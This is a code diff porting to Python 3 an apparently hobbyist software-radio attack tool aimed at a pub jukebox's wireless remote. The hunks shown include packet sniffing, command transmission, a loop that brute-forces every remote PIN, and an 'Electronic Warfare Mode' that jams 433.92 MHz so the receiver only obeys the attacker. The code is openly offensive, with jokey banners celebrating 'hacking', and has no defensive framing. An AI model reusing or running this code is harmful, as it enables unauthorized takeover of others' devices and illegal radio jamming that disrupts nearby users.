@@ -1,6 +1,7 @@
-#!/usr/bin/python
+#!/usr/bin/python3
 
 from rflib import *
+import codecs
 import datetime
 import time
 import sys
@@ -82,7 +83,7 @@ def encode(pin, command):
         ook = hex(int(ook,2))[2:-1]
         if len(ook) % 2 == 1:
                 ook += '0'
-        ook = ook.decode('hex')  
+        ook = codecs.decode(ook, 'hex')  
 
         return ook
 
@@ -113,13 +114,13 @@ def decode(msg):
 #looks for the preamble FFFF00A2888A2
 #FFFF is cut off by d.setMdmSyncWord()
 def verifyPkt(pkt): 
-        if ord(pkt[0]) != 0x00:
+        if pkt[0] != 0x00:
                 return False
-        if ord(pkt[1]) != 0xa2:
+        if pkt[1] != 0xa2:
                 return False
-        if ord(pkt[2]) != 0x88:
+        if pkt[2] != 0x88:
                 return False
-        if ord(pkt[3]) != 0x8A:
+        if pkt[3] != 0x8A:
                 return False
         return True
 
@@ -138,22 +139,21 @@ def scan(d):
         d.setMdmNumPreamble(0)
         d.makePktFLEN(16)
 
-        print "\n-=Hit <ENTER> to stop=-"
+        print("\n-=Hit <ENTER> to stop=-")
 
         while not keystop():
                 pkt, ts = d.RFrecv() #RX packet and timestamp
                 try:
                         if verifyPkt(pkt):
-
-                                msg = '{:b}'.format(int(pkt.encode('hex'),16)) #Strips leding 0's, unicode to str bin
+                                msg = '{:b}'.format(int(pkt.hex(),16)) #Strips leding 0's, unicode to str bin
                                 pin, command, dMsg = decode(msg)
                                 time = datetime.datetime.fromtimestamp(ts).strftime('%H:%M:%S')
-                                print "<*> %s: TX:Preamble + Sync + %s PIN:%s  Command: %s"  % (time,dMsg,pin,command) 
+                                print("<*> %s: TX:Preamble + Sync + %s PIN:%s  Command: %s"  % (time,dMsg,pin,command))
 
                 except ChipconUsbTimeoutException:
                         pass
                 
-        null = raw_input() #Nulls out enter durring a keystop
+        null = input() #Nulls out enter durring a keystop
 
 
 def tx(msg, repeat=0):
@@ -175,17 +175,17 @@ def tx(msg, repeat=0):
 #Trys every PIN for a command
 def bruteForceThisDude(command, keyButton):
         coolDown = "0000" #Gap inbetween each msg
-        coolDown = coolDown.decode('hex') #decode to unicode
+        coolDown = bytes.fromhex(coolDown).decode('utf-8')  #decode to unicode
 
         #Sick intro!
         os.system('clear')
-        print "\n\"What day is today?\" asked Pooh"
+        print("\n\"What day is today?\" asked Pooh")
         time.sleep(1)
-        print "\"It's the day we burn this motherf***** to the ground.\" squeaked Piglet"
+        print("\"It's the day we burn this motherf***** to the ground.\" squeaked Piglet")
         time.sleep(2)
-        print "\"My favorite day.\" said Pooh\n"
+        print("\"My favorite day.\" said Pooh\n")
         time.sleep(1.5)
-        print "<*> BRUTE FORCE IN PROGRESS..."
+        print("<*> BRUTE FORCE IN PROGRESS...")
 
         start = int(time.time())
 
@@ -197,23 +197,23 @@ def bruteForceThisDude(command, keyButton):
                 if len(groupCommand) <= 255-len(part + coolDown):
                         groupCommand += part + coolDown
                 else:
-                        print "<*> TX PINs " + str(pinX) + "-" + str(pin)
+                        print("<*> TX PINs " + str(pinX) + "-" + str(pin))
                         pinX = pin
                         tx(groupCommand)
                         groupCommand = ''
                         groupCommand += part + coolDown
-        print "<*> TX PINs " + str(pinX) + "-" + str(pin)
+        print("<*> TX PINs " + str(pinX) + "-" + str(pin))
         tx(groupCommand)
         
 ##        #One at a time        
 ##        for pin in range(256):
 ##                fullCommand = encode(pin, command)
-##                print "<TX> Command: "+ keyButton + " PIN: " + str(pin)
+##                print("<TX> Command: "+ keyButton + " PIN: " + str(pin))
 ##                tx(fullCommand, 2)
                 
         stop = int(time.time())
         totalTime = stop-start
-        raw_input("\n<*> YOUR BADASS ADVENTURE IN HACKING IS COMPLETE! TIME: %isec. \n\nPress ENTER to continue..." %(totalTime))
+        input("\n<*> YOUR BADASS ADVENTURE IN HACKING IS COMPLETE! TIME: %isec. \n\nPress ENTER to continue..." %(totalTime))
         loop2 = False
         return
                         
@@ -224,7 +224,7 @@ def darnYouMadisonPub():
         d.setRFRegister(PA_TABLE1, 0XFF) #0xFF tx's constantly
         d.setFreq(433.92e6)
         d.setModeTX()
-        print "<*> Jamming at 433.92 MHz"
+        print("<*> Jamming at 433.92 MHz")
 
 def youOkMadisonPub():
         d.setModeIDLE()
@@ -243,14 +243,14 @@ def mainMenu():
                         
                 os.system('clear')
                 print(banner)
-                print '''\n -=Main Menu=-
+                print('''\n -=Main Menu=-
 1.) Scan
 2.) TX
 3.) Electronic Warfare Mode (%s)
-4.) Exit \n'''%(mode)
+4.) Exit \n'''%(mode))
 
                 try:
-                        menuAns=raw_input('Select [1-4]: ')
+                        menuAns = input('Select [1-4]: ')
                         if int(menuAns) == 1:
                                 scan(d)
                         elif int(menuAns) == 2:
@@ -261,11 +261,11 @@ def mainMenu():
                                 youOkMadisonPub()
                                 sys.exit()
                         else: 
-                                print "Not a valid choice, please try again... \n"
-                                time.sleep(.5)        
+                                print("Not a valid choice, please try again... \n")
+                                time.sleep(0.5)        
                 except ValueError:
-                        print "Not a valid choice, please try again... \n"
-                        time.sleep(.5)
+                        print("Not a valid choice, please try again... \n")
+                        time.sleep(0.5)
                         pass
 
 def txMenu():
@@ -280,19 +280,20 @@ def txMenu():
         
         repeat = timesMenu()
         fullCommand = encode(pin, command) #Str binary to bin
+        print(fullCommand)
 
         loop = True
         while loop:
-                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
-                txAns = raw_input("Are you cool like the Fonz to TX '" + keyButton + "' " + repeat + " times? [Y/N]:")
+                print("\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!")
+                txAns = input("Are you cool like the Fonz to TX '" + keyButton + "' " + repeat + " times? [Y/N]:")
                 if txAns.lower() == 'n':
                         loop = False
                 elif txAns.lower() == 'y':
                         flag = True
                         while flag:
-                                print '<*> TXing...\n'
+                                print('<*> TXing...\n')
                                 tx(fullCommand, int(repeat)-1) #Dose the thing with the radio thing
-                                reTransmit = raw_input("TX Again? [Y/N]")
+                                reTransmit = input("TX Again? [Y/N]")
                                 if reTransmit.lower() == 'n':
                                         flag = False
                                         return
@@ -302,7 +303,7 @@ def txMenu():
                                         flag = False
                                         return
                 else:
-                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
+                        print("\nNaw, you don goofed and you're not cool... Please try again thou! :D")
                         youOkMadisonPub()   
                         sys.exit()
 
@@ -310,36 +311,36 @@ def pinMenu():
         loop = True
         while loop:
                 try:
-                        pinAns = raw_input("\nWhich PIN do you want to use? [000-255] [999 to Brute Force]: ")
-                        print "\n"
+                        pinAns = input("\nWhich PIN do you want to use? [000-255] [999 to Brute Force]: ")
+                        print("\n")
                         if int(pinAns) <=255:
                                 loop = False
                                 return int(pinAns)
                         elif int(pinAns) == 999:
                                 return int(pinAns)
                         else:
-                                print "Not a valid choice, please try again... \n"
-                                time.sleep(.5)     
+                                print("Not a valid choice, please try again... \n")
+                                time.sleep(0.5)     
                 except ValueError:
-                        print "Not a valid choice, please try again... \n"
-                        time.sleep(.5)
+                        print("Not a valid choice, please try again... \n")
+                        time.sleep(0.5)
                         pass
 
 def commandMenu():
         global keyButton
-        items = COMMANDS.keys()
+        items = list(COMMANDS.keys())
         items.sort(reverse=1)
 
         for i in range(len(items)-16):
                 offset = 29 - len(str(i+1)+items[i])+3
                 gap = 10 + offset
-                print str(i+1) + ".) " + items[i] + " "*gap  + str(i+17) + ".) " + items[i+16] 
-        print "\n33.) Back \n"
+                print(str(i+1) + ".) " + items[i] + " "*gap  + str(i+17) + ".) " + items[i+16]) 
+        print("\n33.) Back \n")
 
         #Input handling
         while True:
                 try:
-                        commandAns = raw_input('Pick a command. Select [1-33]: ')
+                        commandAns = input('Pick a command. Select [1-33]: ')
                         if int(commandAns) <= 32 and int(commandAns) >= 1:
                                 keyButton = items[int(commandAns)-1] #the chosen command in the items list
                                 value = COMMANDS[str(keyButton)]
@@ -347,10 +348,10 @@ def commandMenu():
                         elif int(commandAns) == 33:
                                 return False, False
                         else:
-                                print "Not a valid choice, please try again... \n"
+                                print("Not a valid choice, please try again... \n")
                                 time.sleep(.5)                                
                 except ValueError:
-                        print "Not a valid choice, please try again... \n"
+                        print("Not a valid choice, please try again... \n")
                         time.sleep(.5)
                         pass
         
@@ -358,17 +359,17 @@ def timesMenu():
         loop = True
         while loop:
                 try:       
-                        timesAns=raw_input("\nTX how many times? [1-65535]: ")
+                        timesAns = input("\nTX how many times? [1-65535]: ")
                         if int(timesAns) <= 65535:
                                         times = int(timesAns)
                                         loop = False
                                         return str(times)
                         else: 
-                                print "Not a valid choice, please try again... \n"
-                                time.sleep(.5)                       
+                                print("Not a valid choice, please try again... \n")
+                                time.sleep(0.5)                       
                 except ValueError:
-                        print "Not a valid choice, please try again... \n"
-                        time.sleep(.5)
+                        print("Not a valid choice, please try again... \n")
+                        time.sleep(0.5)
                         pass        
 
 def bruteMenu():
@@ -377,8 +378,8 @@ def bruteMenu():
                 return
 
         while True:
-                print "\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!"
-                txAns = raw_input("Are you cool like the Fonz to brute force this thing? [Y/N]:")
+                print("\n<*> WARNING! YOU'RE ABOUT TO DO SOME COOL THINGS!")
+                txAns = input("Are you cool like the Fonz to brute force this thing? [Y/N]:")
                 if txAns.lower() == 'n':
                         #loop2 = False
                         return
@@ -386,7 +387,7 @@ def bruteMenu():
                         bruteForceThisDude(value, keyButton)
                         return
                 else:
-                        print "\nNaw, you don goofed and you're not cool... Please try again thou! :D"
+                        print("\nNaw, you don goofed and you're not cool... Please try again thou! :D")
                         youOkMadisonPub()
                         sys.exit()
 
@@ -396,10 +397,10 @@ def ewMenu():
         while loop:
                 try:
                         if ewMode == False:
-                                print "\n<*> Electronic Warfare Mode will JAM the receiver while still"
-                                print "    allowing you to send commands to the Juke Box."
-                                print "<*> This mode stops when you 'Scan'."
-                                ewAns = raw_input("Start EW Mode? [Y/N]: ")
+                                print("\n<*> Electronic Warfare Mode will JAM the receiver while still")
+                                print("    allowing you to send commands to the Juke Box.")
+                                print("<*> This mode stops when you 'Scan'.")
+                                ewAns = input("Start EW Mode? [Y/N]: ")
                                 if ewAns.lower() == 'n':
                                         loop = False
                                         return
@@ -409,10 +410,10 @@ def ewMenu():
                                         darnYouMadisonPub()
                                         return
                                 else:
-                                        print "Not a valid choice, please try again... "
+                                        print("Not a valid choice, please try again... ")
                                         time.sleep(.5)
                         else:
-                                ewAns = raw_input("Stop EW Mode? [Y/N]: ")
+                                ewAns = input("Stop EW Mode? [Y/N]: ")
                                 if ewAns.lower() == 'n':
                                         loop = False
                                         return
@@ -422,10 +423,10 @@ def ewMenu():
                                         youOkMadisonPub()
                                         return
                                 else:
-                                        print "Not a valid choice, please try again..."
+                                        print("Not a valid choice, please try again...")
                                         time.sleep(.5)
                 except ValueError:
-                        print "Not a valid choice, please try again... \n"
+                        print("Not a valid choice, please try again... \n")
                         time.sleep(.5)
                         pass
 
